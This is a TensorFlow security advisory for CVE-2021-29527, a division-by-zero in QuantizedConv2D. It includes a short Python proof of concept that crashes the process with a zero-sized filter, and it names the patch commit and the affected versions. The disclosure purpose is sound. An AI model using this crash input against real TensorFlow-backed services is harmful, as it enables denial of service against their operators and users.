<h2>TFSA-2021-016: Division by 0 in <code>QuantizedConv2D</code></h2>
<h3>CVE Number</h3>
<p>CVE-2021-29527</p>
<h3>Impact</h3>
<p>An attacker can trigger a division by 0 in <code>tf.raw_ops.QuantizedConv2D</code>:</p>
<p>```python
import tensorflow as tf</p>
<p>input = tf.zeros([1, 1, 1, 1], dtype=tf.quint8)
filter = tf.constant([], shape=[1, 0, 1, 1], dtype=tf.quint8)
min_input = tf.constant(0.0)
max_input = tf.constant(0.0001)
min_filter = tf.constant(0.0)
max_filter = tf.constant(0.0001)
strides = [1, 1, 1, 1]
padding = "SAME"</p>
<p>tf.raw_ops.QuantizedConv2D(input=input, filter=filter, min_input=min_input, max_input=max_input, min_filter=min_filter, max_filter=max_filter, strides=strides, padding=padding)
```</p>
<p>This is because the
<a href="https://github.com/tensorflow/tensorflow/blob/00e9a4d67d76703fa1aee33dac582acf317e0e81/tensorflow/core/kernels/quantized_conv_ops.cc#L257-L259">implementation</a> does a division by a quantity that is controlled by the caller:</p>
<p><code>cc
const int filter_value_count = filter_width * filter_height * input_depth;
const int64 patches_per_chunk = kMaxChunkSize / (filter_value_count * sizeof(T1));</code></p>
<h3>Patches</h3>
<p>We have patched the issue in GitHub commit
<a href="https://github.com/tensorflow/tensorflow/commit/cfa91be9863a91d5105a3b4941096044ab32036b">cfa91be9863a91d5105a3b4941096044ab32036b</a>.</p>
<p>The fix will be included in TensorFlow 2.5.0. We will also cherrypick this
commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow
2.1.4, as these are also affected and still in supported range.</p>
